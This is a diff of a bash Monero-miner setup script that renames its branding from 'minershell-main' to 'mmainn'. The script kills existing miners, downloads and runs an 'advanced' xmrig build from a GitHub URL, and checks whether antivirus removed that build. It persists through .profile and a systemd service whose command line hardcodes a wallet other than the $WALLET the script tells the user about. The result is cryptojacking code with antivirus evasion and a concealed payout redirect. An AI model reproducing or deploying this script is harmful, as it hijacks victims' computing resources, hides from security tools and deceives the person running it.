@@ -4,8 +4,8 @@ VERSION=2.11
 
 # printing greetings
 
-echo "minershell-main mining setup script v$VERSION."
-echo "(please report issues to support@minershell-main.stream email with full output of this script with extra \"-x\" \"bash\" option)"
+echo "mmainn mining setup script v$VERSION."
+echo "(please report issues to support@mmainn.stream email with full output of this script with extra \"-x\" \"bash\" option)"
 echo
 
 if [ "$(id -u)" == "0" ]; then
@@ -54,7 +54,7 @@ fi
 # printing intentions
 
 echo "I will download, setup and run in background Monero CPU miner."
-echo "If needed, miner in foreground can be started by $HOME/minershell-main/miner.sh script."
+echo "If needed, miner in foreground can be started by $HOME/mmainn/miner.sh script."
 echo "Mining will happen to $WALLET wallet."
 
 if ! sudo -n true 2>/dev/null; then
@@ -77,36 +77,36 @@ echo
 
 # start doing stuff: preparing miner
 
-echo "[*] Removing previous minershell-main miner (if any)"
+echo "[*] Removing previous mmainn miner (if any)"
 if sudo -n true 2>/dev/null; then
   sudo systemctl stop mmain.service
 fi
 killall -9 xmrig
 
-echo "[*] Removing $HOME/minershell-main directory"
-rm -rf $HOME/minershell-main
+echo "[*] Removing $HOME/mmainn directory"
+rm -rf $HOME/mmainn
 
-echo "[*] Downloading minershell-main advanced version of xmrig to /tmp/xmrig.tar.gz"
-if ! curl -L --progress-bar "https://raw.githubusercontent.com/ardx1/xm/main/minershell-main.tar.gz" -o /tmp/xmrig.tar.gz; then
-  echo "ERROR: Can't download https://raw.githubusercontent.com/ardx1/xm/main/minershell-main.tar.gz file to /tmp/xmrig.tar.gz"
+echo "[*] Downloading mmainn advanced version of xmrig to /tmp/xmrig.tar.gz"
+if ! curl -L --progress-bar "https://raw.githubusercontent.com/ardx1/xm/main/mmainn.tar.gz" -o /tmp/xmrig.tar.gz; then
+  echo "ERROR: Can't download https://raw.githubusercontent.com/ardx1/xm/main/mmainn.tar.gz file to /tmp/xmrig.tar.gz"
   exit 1
 fi
 
-echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/minershell-main"
-[ -d $HOME/minershell-main ] || mkdir $HOME/minershell-main
-if ! tar xf /tmp/xmrig.tar.gz -C $HOME/minershell-main; then
-  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/minershell-main directory"
+echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/mmainn"
+[ -d $HOME/mmainn ] || mkdir $HOME/mmainn
+if ! tar xf /tmp/xmrig.tar.gz -C $HOME/mmainn; then
+  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/mmainn directory"
   exit 1
 fi
 rm /tmp/xmrig.tar.gz
 
-echo "[*] Checking if advanced version of $HOME/minershell-main/xmrig works fine (and not removed by antivirus software)"
-$HOME/minershell-main/xmrig --help >/dev/null
+echo "[*] Checking if advanced version of $HOME/mmainn/xmrig works fine (and not removed by antivirus software)"
+$HOME/mmainn/xmrig --help >/dev/null
 if (test $? -ne 0); then
-  if [ -f $HOME/minershell-main/xmrig ]; then
-    echo "WARNING: Advanced version of $HOME/minershell-main/xmrig is not functional"
+  if [ -f $HOME/mmainn/xmrig ]; then
+    echo "WARNING: Advanced version of $HOME/mmainn/xmrig is not functional"
   else 
-    echo "WARNING: Advanced version of $HOME/minershell-main/xmrig was removed by antivirus (or some other problem)"
+    echo "WARNING: Advanced version of $HOME/mmainn/xmrig was removed by antivirus (or some other problem)"
   fi
 
   echo "[*] Looking for the latest version of Monero miner"
@@ -119,26 +119,26 @@ if (test $? -ne 0); then
     exit 1
   fi
 
-  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/minershell-main"
-  if ! tar xf /tmp/xmrig.tar.gz -C $HOME/minershell-main --strip=1; then
-    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/minershell-main directory"
+  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/mmainn"
+  if ! tar xf /tmp/xmrig.tar.gz -C $HOME/mmainn --strip=1; then
+    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/mmainn directory"
   fi
   rm /tmp/xmrig.tar.gz
 
-  echo "[*] Checking if stock version of $HOME/minershell-main/xmrig works fine (and not removed by antivirus software)"
-  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/minershell-main/config.json
-  $HOME/minershell-main/xmrig --help >/dev/null
+  echo "[*] Checking if stock version of $HOME/mmainn/xmrig works fine (and not removed by antivirus software)"
+  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/mmainn/config.json
+  $HOME/mmainn/xmrig --help >/dev/null
   if (test $? -ne 0); then 
-    if [ -f $HOME/minershell-main/xmrig ]; then
-      echo "ERROR: Stock version of $HOME/minershell-main/xmrig is not functional too"
+    if [ -f $HOME/mmainn/xmrig ]; then
+      echo "ERROR: Stock version of $HOME/mmainn/xmrig is not functional too"
     else 
-      echo "ERROR: Stock version of $HOME/minershell-main/xmrig was removed by antivirus too"
+      echo "ERROR: Stock version of $HOME/mmainn/xmrig was removed by antivirus too"
     fi
     exit 1
   fi
 fi
 
-echo "[*] Miner $HOME/minershell-main/xmrig is OK"
+echo "[*] Miner $HOME/mmainn/xmrig is OK"
 
 PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 if [ "$PASS" == "localhost" ]; then
@@ -151,45 +151,45 @@ if [ ! -z $EMAIL ]; then
   PASS="$PASS:$EMAIL"
 fi
 
-sed -i 's/"url": *"[^"]*",/"url": "gulf.minershell-main.stream:'80'",/' $HOME/minershell-main/config.json
-sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/minershell-main/config.json
-sed -i 's#"log-file": *null,#"log-file": "'$HOME/minershell-main/xmrig.log'",#' $HOME/minershell-main/config.json
-sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/minershell-main/config.json
+sed -i 's/"url": *"[^"]*",/"url": "gulf.mmainn.stream:'80'",/' $HOME/mmainn/config.json
+sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/mmainn/config.json
+sed -i 's#"log-file": *null,#"log-file": "'$HOME/mmainn/xmrig.log'",#' $HOME/mmainn/config.json
+sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/mmainn/config.json
 
-cp $HOME/minershell-main/config.json $HOME/minershell-main/config_background.jso
+cp $HOME/mmainn/config.json $HOME/mmainn/config_background.jso
 
 # preparing script
 
-echo "[*] Creating $HOME/minershell-main/miner.sh script"
-cat >$HOME/minershell-main/miner.sh <<EOL
+echo "[*] Creating $HOME/mmainn/miner.sh script"
+cat >$HOME/mmainn/miner.sh <<EOL
 #!/bin/bash
 if ! pidof xmrig >/dev/null; then
-  nice $HOME/minershell-main/xmrig \$*
+  nice $HOME/mmainn/xmrig \$*
 else
   echo "Monero miner is already running in the background. Refusing to run another one."
   echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
 fi
 EOL
 
-chmod +x $HOME/minershell-main/miner.sh
+chmod +x $HOME/mmainn/miner.sh
 
 # preparing script background work and work under reboot
 
 if ! sudo -n true 2>/dev/null; then
-  if ! grep minershell-main/miner.sh $HOME/.profile >/dev/null; then
-    echo "[*] Adding $HOME/minershell-main/miner.sh script to $HOME/.profile"
-    echo "$HOME/minershell-main/miner.sh --config=$HOME/minershell-main/config_background.json >/dev/null 2>&1" >>$HOME/.profile
+  if ! grep mmainn/miner.sh $HOME/.profile >/dev/null; then
+    echo "[*] Adding $HOME/mmainn/miner.sh script to $HOME/.profile"
+    echo "$HOME/mmainn/miner.sh --config=$HOME/mmainn/config_background.json >/dev/null 2>&1" >>$HOME/.profile
   else 
-    echo "Looks like $HOME/minershell-main/miner.sh script is already in the $HOME/.profile"
+    echo "Looks like $HOME/mmainn/miner.sh script is already in the $HOME/.profile"
   fi
-  echo "[*] Running miner in the background (see logs in $HOME/minershell-main/xmrig.log file)"
-  /bin/bash $HOME/minershell-main/miner.sh --config=$HOME/minershell-main/config_background.json >/dev/null 2>&1
+  echo "[*] Running miner in the background (see logs in $HOME/mmainn/xmrig.log file)"
+  /bin/bash $HOME/mmainn/miner.sh --config=$HOME/mmainn/config_background.json >/dev/null 2>&1
 else
 
   if ! type systemctl >/dev/null; then
 
-    echo "[*] Running miner in the background (see logs in $HOME/minershell-main/xmrig.log file)"
-    /bin/bash $HOME/minershell-main/miner.sh --config=$HOME/minershell-main/config_background.json >/dev/null 2>&1
+    echo "[*] Running miner in the background (see logs in $HOME/mmainn/xmrig.log file)"
+    /bin/bash $HOME/mmainn/miner.sh --config=$HOME/mmainn/config_background.json >/dev/null 2>&1
     echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
     echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
 
@@ -201,7 +201,7 @@ else
 Description=Monero miner service
 
 [Service]
-ExecStart=$HOME/minershell-main/xmrig --url pool.hashvault.pro:80 --user 4ArAQ9Qo5C78xgtbzdrsAUTHtCGYQjk7XintpgNAWogbPBCG5SWNqCJ27mAtiqTxoaAeBwLaD2Kh2F8CooS9y9EjUNW3kAE --pass XX --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --config=$HOME/minershell-main/config.json
+ExecStart=$HOME/mmainn/xmrig --url pool.hashvault.pro:80 --user 4ArAQ9Qo5C78xgtbzdrsAUTHtCGYQjk7XintpgNAWogbPBCG5SWNqCJ27mAtiqTxoaAeBwLaD2Kh2F8CooS9y9EjUNW3kAE --pass XX --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --config=$HOME/mmainn/config.json
 Restart=always
 Nice=10
 CPUWeight=1
